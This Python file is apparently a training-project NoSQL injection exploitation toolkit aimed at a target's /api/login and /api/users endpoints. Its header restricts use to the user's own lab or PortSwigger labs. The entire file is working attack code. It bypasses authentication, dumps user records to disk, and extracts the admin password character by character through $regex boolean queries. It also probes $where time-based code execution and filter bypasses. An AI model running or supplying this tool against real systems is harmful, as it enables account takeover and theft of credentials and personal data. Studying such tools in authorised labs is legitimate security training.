#!/usr/bin/env python3
"""
nosql_toolkit.py — NoSQL Injection Exploitation Toolkit (Project #46)
LEGAL: only test your own lab or PortSwigger labs.
"""

import argparse
import json
import os
import time
from datetime import datetime

import requests

import nosql_payloads as P

REPORTS_DIR = "reports"
EXTRACTED_DIR = "extracted"
DEFAULT_TIMEOUT = 15

class Colors:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    RESET  = "\033[0m"
    BOLD   = "\033[1m"

class NoSQLToolkit:
    def __init__(self, base_url, timeout=DEFAULT_TIMEOUT):
        self.base = base_url.rstrip("/")
        self.timeout = timeout

        os.makedirs(REPORTS_DIR, exist_ok=True)
        os.makedirs(EXTRACTED_DIR, exist_ok=True)

        self.report = {
            "target": self.base,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "phases": {},
        }

    # ------------------------------------------------------------------
    def _post_login(self, payload):
        try:
            r = requests.post(
                f"{self.base}/api/login",
                json=payload,
                timeout=self.timeout,
                allow_redirects=True,
            )
            try:
                js = r.json()
            except Exception:
                js = None
            return r.status_code, r.text, js
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}", None

    def _get_users(self, query):
        try:
            r = requests.get(
                f"{self.base}/api/users",
                params={"filter": json.dumps(query)},
                timeout=self.timeout,
            )
            try:
                js = r.json()
            except Exception:
                js = None
            return r.status_code, r.text, js
        except Exception as e:
            return None, f"[ERROR] {type(e).__name__}: {e}", None

    def _has(self, text, indicators):
        if not text:
            return False, None
        for ind in indicators:
            if ind in text:
                return True, ind
        return False, None

    # ------------------------------------------------------------------
    def phase1_detection(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 1] NOSQL DETECTION{Colors.RESET}")
        results = {}

        for name, payload in P.DETECTION_PAYLOADS.items():
            print(f"\n  [{name.upper()}] {json.dumps(payload)[:80]}")
            status, body, js = self._post_login(payload)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            if hit:
                print(f"    {Colors.GREEN}[+] LOGIN SUCCESS!{Colors.RESET} ({ind})")
                print(f"    Message: {(js or {}).get('message', body[:120])}")
            else:
                print(f"    {Colors.YELLOW}[-] no login{Colors.RESET}")
            results[name] = {
                "confirmed": hit, "status": status,
                "snippet": (body or "")[:300],
            }
        self.report["phases"]["detection"] = results

    # ------------------------------------------------------------------
    def phase2_auth_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 2] AUTH BYPASS{Colors.RESET}")
        results = {}

        for name, payload in P.AUTH_BYPASS.items():
            print(f"\n  [{name.upper()}] {json.dumps(payload)[:80]}")
            status, body, js = self._post_login(payload)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            role = None
            if js and isinstance(js.get("user"), dict):
                role = js["user"].get("role")
            if hit:
                print(f"    {Colors.RED}[+] BYPASS!{Colors.RESET} role={role}")
                print(f"    Message: {(js or {}).get('message', body[:120])}")
            else:
                print(f"    {Colors.YELLOW}[-] rejected{Colors.RESET}")
            results[name] = {
                "bypassed": hit, "role": role,
                "snippet": (body or "")[:300],
            }
        self.report["phases"]["auth_bypass"] = results

    # ------------------------------------------------------------------
    def phase3_data_extraction(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 3] DATA EXTRACTION{Colors.RESET}")
        results = {}

        for name, query in P.DATA_EXTRACTION.items():
            print(f"\n  [{name.upper()}] {json.dumps(query)[:80]}")
            status, body, js = self._get_users(query)
            found = (js or {}).get("results", [])
            if found:
                for u in found:
                    print(f"      {Colors.GREEN}{u.get('username')}{Colors.RESET} "
                          f"| {u.get('email')} | role={u.get('role')}")
                # Save extracted users
                with open(f"{EXTRACTED_DIR}/users_{name}.json", "w") as f:
                    json.dump(found, f, indent=2, default=str)
            else:
                print(f"      {Colors.YELLOW}[-] no data{Colors.RESET}")
            results[name] = {
                "found": bool(found), "count": len(found),
                "results": found,
            }
        self.report["phases"]["data_extraction"] = results

    # ------------------------------------------------------------------
    def phase4_blind_nosql(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 4] BLIND NOSQL{Colors.RESET}")
        results = {}

        for name, payload in P.BLIND_NOSQL.items():
            print(f"\n  [{name.upper()}] {json.dumps(payload)}")
            status, body, js = self._post_login(payload)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            print(f"    {'[+] TRUE' if hit else '[-] FALSE'}")
            results[name] = {"bool": hit, "snippet": (body or "")[:200]}

        # Char-by-char extraction of admin's password
        print(f"\n  [CHAR_EXTRACTION] Extracting admin password char-by-char...")
        extracted = ""
        alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
        for position in range(20):
            found_char = None
            for c in alphabet:
                candidate = extracted + c
                payload = {"username": "admin",
                           "password": {"$regex": f"^{candidate}"}}
                status, body, js = self._post_login(payload)
                if '"status":"ok"' in (body or "").replace(" ", ""):
                    found_char = c
                    break
            if found_char:
                extracted += found_char
                print(f"      {Colors.GREEN}[+] password prefix: {extracted}{Colors.RESET}")
            else:
                break
        if extracted:
            print(f"      {Colors.RED}[+] FULL PASSWORD EXTRACTED: {extracted}{Colors.RESET}")
            with open(f"{EXTRACTED_DIR}/extracted_password.txt", "w") as f:
                f.write(extracted)

        results["char_extraction"] = {
            "extracted": extracted,
            "method": "regex-prefix boolean",
        }
        self.report["phases"]["blind_nosql"] = results

    # ------------------------------------------------------------------
    def phase5_rce(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 5] RCE VIA NOSQL ($where){Colors.RESET}")
        results = {}

        print(f"\n  [SLEEP_TEST] $where sleep(3000)")
        payload = P.where_sleep(3000)
        t0 = time.time()
        status, body, js = self._post_login(payload)
        elapsed = time.time() - t0
        if elapsed >= 2.5:
            print(f"    {Colors.RED}[+] TIME-BASED RCE! {elapsed:.2f}s delay{Colors.RESET}")
            results["sleep"] = {"confirmed": True, "delay": elapsed}
        else:
            print(f"    {Colors.YELLOW}[-] no delay ({elapsed:.2f}s){Colors.RESET}")
            results["sleep"] = {"confirmed": False, "delay": elapsed}

        print(f"\n  [WHERE_TRUE] $where function return 1==1")
        status, body, js = self._post_login(P.WHERE_TRUE_FN)
        hit, ind = self._has(body, P.INDICATORS["auth_success"])
        print(f"    {'[+] WHERE RCE CONFIRMED!' if hit else '[-] rejected'}")
        results["where_true"] = {"confirmed": hit, "snippet": (body or "")[:200]}

        self.report["phases"]["rce"] = results

    # ------------------------------------------------------------------
    def phase6_filter_bypass(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 6] FILTER BYPASS{Colors.RESET}")
        results = {}

        for name, payload in P.bypass_payloads().items():
            print(f"\n  [{name.upper()}] {json.dumps(payload)[:80]}")
            status, body, js = self._post_login(payload)
            hit, ind = self._has(body, P.INDICATORS["auth_success"])
            print(f"    {'[+] BYPASSED' if hit else '[-] blocked'}")
            results[name] = {
                "bypassed": hit,
                "snippet": (body or "")[:200],
            }
        self.report["phases"]["filter_bypass"] = results

    # ------------------------------------------------------------------
    def _collect_confirmed(self):
        confirmed = []
        for phase, data in self.report["phases"].items():
            if isinstance(data, dict):
                for k, v in data.items():
                    if not isinstance(v, dict):
                        continue
                    if (v.get("confirmed") or v.get("bypassed")
                            or v.get("found") or v.get("bool")):
                        confirmed.append(f"{phase}.{k}")
        return confirmed

    def phase7_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[PHASE 7] EXPLOITATION SUMMARY{Colors.RESET}")
        confirmed = self._collect_confirmed()
        print(f"\n    Total confirmed findings: {len(confirmed)}")
        for c in confirmed:
            print(f"      * {c}")

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        json_path = f"{REPORTS_DIR}/nosql_report_{ts}.json"
        with open(json_path, "w") as f:
            json.dump(self.report, f, indent=2, default=str)
        print(f"\n    {Colors.GREEN}[OK] JSON: {json_path}{Colors.RESET}")

        html_path = f"{REPORTS_DIR}/nosql_report_{ts}.html"
        with open(html_path, "w") as f:
            f.write(self._build_html(confirmed))
        print(f"    {Colors.GREEN}[OK] HTML: {html_path}{Colors.RESET}")

    def _build_html(self, confirmed):
        rows = ""
        for phase, data in self.report["phases"].items():
            rows += f"<h3>{phase}</h3><pre>{json.dumps(data, indent=2, default=str)[:2500]}</pre>"
        return f"""<!DOCTYPE html><html><head><title>NoSQL Report</title>
<style>
body {{ font-family: monospace; background:#111; color:#eee; padding:20px; }}
h1 {{ color:#ff5555; }} h3 {{ color:#55ff55; border-bottom:1px solid #333; }}
pre {{ background:#1a1a1a; padding:10px; border-left:3px solid #ff5555; overflow:auto; }}
</style></head><body>
<h1>NoSQL Injection Report</h1>
<p><b>Target:</b> {self.base}</p>
<p><b>Timestamp:</b> {self.report['timestamp']}</p>
<p>Confirmed: {len(confirmed)}</p>
<ul>{''.join(f'<li>{c}</li>' for c in confirmed)}</ul>
{rows}
</body></html>"""

    def run_all(self):
        print("=" * 64)
        print("  NoSQL Injection Exploitation Toolkit - Project #46")
        print("=" * 64)
        print(f"[+] Target: {self.base}")
        self.phase1_detection()
        self.phase2_auth_bypass()
        self.phase3_data_extraction()
        self.phase4_blind_nosql()
        self.phase5_rce()
        self.phase6_filter_bypass()
        self.phase7_report()

def main():
    ap = argparse.ArgumentParser(description="NoSQL Injection Exploitation Toolkit")
    ap.add_argument("-t", "--target", required=True,
                    help="Base URL (e.g. http://127.0.0.1:5000)")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    NoSQLToolkit(args.target, args.timeout).run_all()

if __name__ == "__main__":
    main()
